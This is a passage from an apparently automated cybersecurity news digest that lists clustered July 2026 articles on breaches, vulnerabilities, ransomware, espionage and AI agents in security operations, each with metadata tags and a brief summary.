  - Summary: Accuris has announced new AI capabilities for BOM Intelligence, part of its Supply Chain Intelligence suite. The launch gives engineering, procurement and supply chain teams a clearer way to move from spotting component risk to acting on it: catching obsolescence early, closing compliance gaps and governing sourcing decisions across programs. Every capability runs on the same foundation: verified data covering 1.3 billion electronic components at 98%+ accuracy, built on 35+ years of direct manufacturer relationships … More → The post Accuris uses AI to improve BOM decisions and supply chain resilience appeared first on Help Net Security .

### Cluster 7f4871768d — score 9

- Title: Weekly Update 514: This Week in Data Breaches
- Source: Troy Hunt (practitioner_analysis)
- Published: 2026-07-26T09:14:51+00:00
- Link: https://www.troyhunt.com/weekly-update-514/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- affected_industries: critical_infrastructure
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Summary

```
The Origin Energy breach down here in Aus is all over the news this week, and as with many breaches, it's multi-faceted. You've got them leading with "don't worry, your credit card is fine", the hacker leading with "they didn&
```

#### Corroborating sources (1)

- **Troy Hunt** (practitioner_analysis)
  - Title: Weekly Update 514: This Week in Data Breaches
  - Published: 2026-07-26T09:14:51+00:00
  - Link: https://www.troyhunt.com/weekly-update-514/
  - Summary: The Origin Energy breach down here in Aus is all over the news this week, and as with many breaches, it's multi-faceted. You've got them leading with "don't worry, your credit card is fine", the hacker leading with "they didn&

### Cluster fa1b41f3b5 — score 9

- Title: Risky Bulletin: A JSON RCE bug is about to rock the Java world
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-07-27T06:28:36+00:00
- Link: https://risky.biz/RBNEWS592/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: apt_espionage
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
A JSON bug is about to rock the Java world, scam compounds continue in Myanmar despite the junta crackdown, and Google has a new APT naming scheme.
```

#### Corroborating sources (1)

- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: A JSON RCE bug is about to rock the Java world
  - Published: 2026-07-27T06:28:36+00:00
  - Link: https://risky.biz/RBNEWS592/
  - Summary: A JSON bug is about to rock the Java world, scam compounds continue in Myanmar despite the junta crackdown, and Google has a new APT naming scheme.

### Cluster c39a89392e — score 9

- Title: Announcing the Cloud Security Alliance on AWS Compliance Guide
- Source: AWS Security Blog (cloud_identity_infrastructure)
- Published: 2026-07-27T16:15:44+00:00
- Link: https://aws.amazon.com/blogs/security/announcing-the-cloud-security-alliance-on-aws-compliance-guide/
- Fetch status: not_attempted
- Member count: 2
- Corroborating source count: 2
- Strong signals: AWS

#### Cluster taxonomy (union across members)
- affected_products: AWS
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_products: AWS
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
AWS Security Assurance Services is announcing the release of the Cloud Security Alliance (CSA) Compliance Guide on Amazon Web Service (AWS), a new resource that maps the 17 control domains and 207 control objectives of the Cloud Controls Matrix v4.1 (CCM) to AWS services and recommended implementation practices. The guide is intended to help organizations […]
```

#### Corroborating sources (2)

- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: Announcing the Cloud Security Alliance on AWS Compliance Guide
  - Published: 2026-07-27T16:15:44+00:00
  - Link: https://aws.amazon.com/blogs/security/announcing-the-cloud-security-alliance-on-aws-compliance-guide/
  - Summary: AWS Security Assurance Services is announcing the release of the Cloud Security Alliance (CSA) Compliance Guide on Amazon Web Service (AWS), a new resource that maps the 17 control domains and 207 control objectives of the Cloud Controls Matrix v4.1 (CCM) to AWS services and recommended implementation practices. The guide is intended to help organizations […]
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: ShutterGap: Aryon Security finds 3.7M AWS cloud resources exposed beyond CSPM/CNAPP visibility
  - Published: 2026-07-29T13:00:01+00:00
  - Link: https://www.helpnetsecurity.com/2026/07/29/cspm-blind-spot-report/
  - Summary: Research from Aryon reveals that each year, 3,731,699 short-lived cloud resources containing highly sensitive information are publicly exposed. This impacts any organization using AWS services that support public sharing. These exposures often last only minutes or hours, too briefly for periodically scanning CSPM and CNAPP platforms to detect, yet long enough for attackers to discover and copy them. ￼ The findings expose a fundamental limitation of the reactive CSPM/CNAPP model: some cloud misconfigurations can be exploited … More → The post ShutterGap: Aryon Security finds 3.7M AWS cloud resources exposed beyond CSPM/CNAPP visibility appeared first on Help Net Security .

### Cluster 9494052eb3 — score 9

- Title: Best Buy scales AI workloads and secures access with Workforce Identity Federation
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-07-28T16:00:00+00:00
- Link: https://cloud.google.com/blog/topics/retail/best-buy-scales-secure-ai-access-with-workforce-identity-federation/
- Fetch status: not_attempted
- Member count: 3
- Corroborating source count: 2
- Strong signals: Google Cloud

#### Cluster taxonomy (union across members)
- affected_products: Azure, Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
As Best Buy expanded its use of Google Cloud for advanced analytics and AI, its technology teams faced two significant scaling challenges: Mitigating risk and managing administrative friction when syncing thousands of backend users from Microsoft Entra ID. The retailer solved both problems and paved the way for a massive cloud expansion by implementing Google Cloud's Workforce Identity Federation . This direct approach allowed developers to access cloud resources securely using their existing Microsoft credentials without a separate identity store, giving technical leadership confidence that access remains strictly controlled, auditable, and manageable at scale. Replacing service accounts with direct federation Best Buy historically maintained complex synchronization pipelines to copy backend users from Entra ID to Google Cloud. Because the organization used Cloud Identity without a Google Workspace deployment, it needed a more direct approach. Previously, Best Buy's Power BI integrati
```

#### Corroborating sources (2)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Best Buy scales AI workloads and secures access with Workforce Identity Federation
  - Published: 2026-07-28T16:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/retail/best-buy-scales-secure-ai-access-with-workforce-identity-federation/
  - Summary: As Best Buy expanded its use of Google Cloud for advanced analytics and AI, its technology teams faced two significant scaling challenges: Mitigating risk and managing administrative friction when syncing thousands of backend users from Microsoft Entra ID. The retailer solved both problems and paved the way for a massive cloud expansion by implementing Google Cloud's Workforce Identity Federation . This direct approach allowed developers to access cloud resources securely using their existing Microsoft credentials without a separate identity store, giving technical leadership confidence that access remains strictly controlled, auditable, and manageable at scale. Replacing service accounts with direct federation Best Buy historically maintained complex synchronization pipelines to copy backend users from Entra ID to Google Cloud. Because the organization used Cloud Identity without a Google Workspace deployment, it needed a more direct approach. Previously, Best Buy's Power BI integrati
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: 'Confused Deputy' Flaws Persist in Google Cloud, Microsoft Azure
  - Published: 2026-07-27T20:57:26+00:00
  - Link: https://www.darkreading.com/cloud-security/confused-deputy-flaws-google-cloud-microsoft-azure
  - Summary: This category of vulnerabilities allows an attacker to easily acquire administrative level permissions and bypass cloud providers' access controls.

### Cluster 65bbcc1b2d — score 8

- Title: US and allies say Russian hackers stole emails without social engineering
- Source: Proofpoint Threat Insight (detection_response_operations)
- Published: 2026-07-23T16:09:25+00:00
- Link: https://www.proofpoint.com/us/newsroom/news/us-and-allies-say-russian-hackers-stole-emails-without-social-engineering
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_2_operator

#### Corroborating sources (1)

- **Proofpoint Threat Insight** (detection_response_operations)
  - Title: US and allies say Russian hackers stole emails without social engineering
  - Published: 2026-07-23T16:09:25+00:00
  - Link: https://www.proofpoint.com/us/newsroom/news/us-and-allies-say-russian-hackers-stole-emails-without-social-engineering

### Cluster 3ed06f107d — score 8

- Title: Chaos in Teams vishing
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-07-28T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/chaos-in-teams-vishing
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Attackers used Microsoft Teams vishing, custom malware, and remote access tools to facilitate ransomware deployment Categories: Threat Research Tags: Microsoft Teams, vishing, Ransomware, Chaos
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: Chaos in Teams vishing
  - Published: 2026-07-28T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/chaos-in-teams-vishing
  - Summary: Attackers used Microsoft Teams vishing, custom malware, and remote access tools to facilitate ransomware deployment Categories: Threat Research Tags: Microsoft Teams, vishing, Ransomware, Chaos

### Cluster 1bd9009eca — score 8

- Title: 2607-secai
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-07-27T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/2607-secai
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>What that means for Customer Protections </p> Categories: Threat Research, AI Research
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: 2607-secai
  - Published: 2026-07-27T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/2607-secai
  - Summary: <p>What that means for Customer Protections </p> Categories: Threat Research, AI Research

### Cluster d78beff971 — score 8

- Title: Inside Elastic InfoSec's agentic SOC: How we cut AI agent LLM calls by 60%
- Source: Elastic Security Labs (detection_response_operations)
- Published: 2026-07-27T00:00:00+00:00
- Link: https://www.elastic.co/security-labs/ai-agent-optimization-production-scale
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
We run fourteen AI agents that triage Elastic InfoSec alerts. They were taking 19 LLM calls to do work that needed 8. Here's the five-step optimization loop we run across the fleet, plus the prompt template you can use with any AI assistant.
```

#### Corroborating sources (1)

- **Elastic Security Labs** (detection_response_operations)
  - Title: Inside Elastic InfoSec's agentic SOC: How we cut AI agent LLM calls by 60%
  - Published: 2026-07-27T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/ai-agent-optimization-production-scale
  - Summary: We run fourteen AI agents that triage Elastic InfoSec alerts. They were taking 19 LLM calls to do work that needed 8. Here's the five-step optimization loop we run across the fleet, plus the prompt template you can use with any AI assistant.

### Cluster 1c5982430a — score 8

- Title: Inside Elastic InfoSec's agentic SOC: When to inline your agent's skills for a 5× cost reduction
- Source: Elastic Security Labs (detection_response_operations)
- Published: 2026-07-24T00:00:00+00:00
- Link: https://www.elastic.co/security-labs/agentic-soc-token-budget-architecture
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
We tested two agentic SOC architectures in parallel across 36,822 real Agent Builder conversations. One won by 5.7x: a specialized workflow triaging alerts for $0.69 each, against $3.42 for a single agent juggling 14 Skills. The data and the decision framework are both below.
```

#### Corroborating sources (1)

- **Elastic Security Labs** (detection_response_operations)
  - Title: Inside Elastic InfoSec's agentic SOC: When to inline your agent's skills for a 5× cost reduction
  - Published: 2026-07-24T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/agentic-soc-token-budget-architecture
  - Summary: We tested two agentic SOC architectures in parallel across 36,822 real Agent Builder conversations. One won by 5.7x: a specialized workflow triaging alerts for $0.69 each, against $3.42 for a single agent juggling 14 Skills. The data and the decision framework are both below.

### Cluster ca5b8d1443 — score 8

- Title: Health-ISAC warns of rising ShinyHunters data theft attacks on healthcare
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-29T17:54:05+00:00
- Link: https://www.bleepingcomputer.com/news/security/health-isac-warns-of-rising-shinyhunters-data-theft-attacks-on-healthcare/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: ShinyHunters

#### Cluster taxonomy (union across members)
- actor_attribution: ShinyHunters
- affected_industries: healthcare
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- actor_attribution: ShinyHunters
- affected_industries: healthcare
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Health-ISAC, a cybersecurity information-sharing organization for the health sector, is warning healthcare and medical technology organizations of an observed increase in successful attacks by ShinyHunters. [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Health-ISAC warns of rising ShinyHunters data theft attacks on healthcare
  - Published: 2026-07-29T17:54:05+00:00
  - Link: https://www.bleepingcomputer.com/news/security/health-isac-warns-of-rising-shinyhunters-data-theft-attacks-on-healthcare/
  - Summary: Health-ISAC, a cybersecurity information-sharing organization for the health sector, is warning healthcare and medical technology organizations of an observed increase in successful attacks by ShinyHunters. [...]

### Cluster d84cf1aa09 — score 8

- Title: Over 24,000 exposed server BMCs leak password hash via decades-old flaw
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-28T12:10:23+00:00
- Link: https://www.bleepingcomputer.com/news/security/over-24-000-exposed-server-bmcs-leak-password-hash-via-decades-old-flaw/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
More than 24,000 internet-exposed servers are leaking authentication password hashes due to a 20-year-old vulnerability in their Baseboard Management Controller (BMC) interface. [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Over 24,000 exposed server BMCs leak password hash via decades-old flaw
  - Published: 2026-07-28T12:10:23+00:00
  - Link: https://www.bleepingcomputer.com/news/security/over-24-000-exposed-server-bmcs-leak-password-hash-via-decades-old-flaw/
  - Summary: More than 24,000 internet-exposed servers are leaking authentication password hashes due to a 20-year-old vulnerability in their Baseboard Management Controller (BMC) interface. [...]

### Cluster 470d15038a — score 8

- Title: Data breach at medical billing firm MCBS affects 1.26 million people
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-28T09:10:03+00:00
- Link: https://www.bleepingcomputer.com/news/security/data-breach-at-medical-billing-firm-mcbs-affects-126-million-people/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: healthcare
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: healthcare
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Healthcare billing company Medical Computer Business Services (MCBS) has disclosed that a 2025 network breach exposed the sensitive information of more than 1.2 million people. [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Data breach at medical billing firm MCBS affects 1.26 million people
  - Published: 2026-07-28T09:10:03+00:00
  - Link: https://www.bleepingcomputer.com/news/security/data-breach-at-medical-billing-firm-mcbs-affects-126-million-people/
  - Summary: Healthcare billing company Medical Computer Business Services (MCBS) has disclosed that a 2025 network breach exposed the sensitive information of more than 1.2 million people. [...]

### Cluster 45d553e8d1 — score 8

- Title: Patch-Resistant 'RufRoot' Flaw Can Unleash Malicious AI Agent Swarms
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-07-29T14:40:33+00:00
- Link: https://www.darkreading.com/cyber-risk/patch-resistant-rufroot-flaw-malicious-ai-agent-swarms
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The vulnerability in the AI hosting platform Ruflo allows an unauthenticated attacker to take over the system and corrupt memory, so bad behavior can persist after patching.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Patch-Resistant 'RufRoot' Flaw Can Unleash Malicious AI Agent Swarms
  - Published: 2026-07-29T14:40:33+00:00
  - Link: https://www.darkreading.com/cyber-risk/patch-resistant-rufroot-flaw-malicious-ai-agent-swarms
  - Summary: The vulnerability in the AI hosting platform Ruflo allows an unauthenticated attacker to take over the system and corrupt memory, so bad behavior can persist after patching.

### Cluster 39354a1568 — score 8

- Title: AI Agent Drives Espionage Attack on Thai Ministry of Finance
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-07-28T01:00:00+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/ai-agent-espionage-attack-thai-ministry-finance
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: financial_services
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: financial_services
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Attackers used Hermes, an autonomous open source tool, in unrestricted "YOLO mode" to conduct espionage against Thailand's Ministry of Finance.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: AI Agent Drives Espionage Attack on Thai Ministry of Finance
  - Published: 2026-07-28T01:00:00+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/ai-agent-espionage-attack-thai-ministry-finance
  - Summary: Attackers used Hermes, an autonomous open source tool, in unrestricted "YOLO mode" to conduct espionage against Thailand's Ministry of Finance.

### Cluster 361cf175a3 — score 8

- Title: Adversaries Don't Need a Zero-Day — They Read Your Rulebook
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-07-27T17:31:18+00:00
- Link: https://www.darkreading.com/threat-intelligence/adversaries-do-not-need-zero-day-they-read-your-rulebook
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Confidence in autonomous security tools is declining, and here's why.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Adversaries Don't Need a Zero-Day — They Read Your Rulebook
  - Published: 2026-07-27T17:31:18+00:00
  - Link: https://www.darkreading.com/threat-intelligence/adversaries-do-not-need-zero-day-they-read-your-rulebook
  - Summary: Confidence in autonomous security tools is declining, and here's why.

### Cluster b849eebcfc — score 8

- Title: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-07-23T01:00:00+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain
  - Published: 2026-07-23T01:00:00+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain
  - Summary: A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.

### Cluster 38f761d8f9 — score 8

- Title: Researchers Show a Single Malicious Webpage Visit Can Compromise Tor Browser
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-29T11:57:00+00:00
- Link: https://thehackernews.com/2026/07/researchers-show-single-malicious.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-10702

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-10702
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-10702
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Nebula Security says a patched Firefox JIT flaw could be triggered by simply visiting a malicious webpage and was also used to compromise Tor Browser. Tracked as CVE-2026-10702, the bug provides arbitrary code execution inside the browser's renderer process. Mozilla rated it High and fixed it in the Firefox 151.0.3 update. "No settings or additional user interaction are required," Eten Zou,
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Researchers Show a Single Malicious Webpage Visit Can Compromise Tor Browser
  - Published: 2026-07-29T11:57:00+00:00
  - Link: https://thehackernews.com/2026/07/researchers-show-single-malicious.html
  - Summary: Nebula Security says a patched Firefox JIT flaw could be triggered by simply visiting a malicious webpage and was also used to compromise Tor Browser. Tracked as CVE-2026-10702, the bug provides arbitrary code execution inside the browser's renderer process. Mozilla rated it High and fixed it in the Firefox 151.0.3 update. "No settings or additional user interaction are required," Eten Zou,

### Cluster ac434a158a — score 8

- Title: Tengu Botnet Reboots Compromised Linux Devices When Defenders Kill Its Process
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-28T15:01:33+00:00
- Link: https://thehackernews.com/2026/07/tengu-botnet-reboots-compromised-linux.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ddos
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ddos
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A new Mirai-derived botnet called Tengu can use a compromised Linux device's hardware watchdog to trigger a reboot when defenders kill its main process. If that happens, Tengu's other persistence mechanisms get another chance to relaunch it. Nozomi Networks Labs observed the dropper reaching its honeypots through Telnet credential brute force. Tengu supports 25 distributed denial-of-service (
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Tengu Botnet Reboots Compromised Linux Devices When Defenders Kill Its Process
  - Published: 2026-07-28T15:01:33+00:00
  - Link: https://thehackernews.com/2026/07/tengu-botnet-reboots-compromised-linux.html
  - Summary: A new Mirai-derived botnet called Tengu can use a compromised Linux device's hardware watchdog to trigger a reboot when defenders kill its main process. If that happens, Tengu's other persistence mechanisms get another chance to relaunch it. Nozomi Networks Labs observed the dropper reaching its honeypots through Telnet credential brute force. Tengu supports 25 distributed denial-of-service (

### Cluster 76e10c02ae — score 8

- Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-23T18:36:08+00:00
- Link: https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA, CISA and partner agencies published
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
  - Published: 2026-07-23T18:36:08+00:00
  - Link: https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
  - Summary: A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA, CISA and partner agencies published
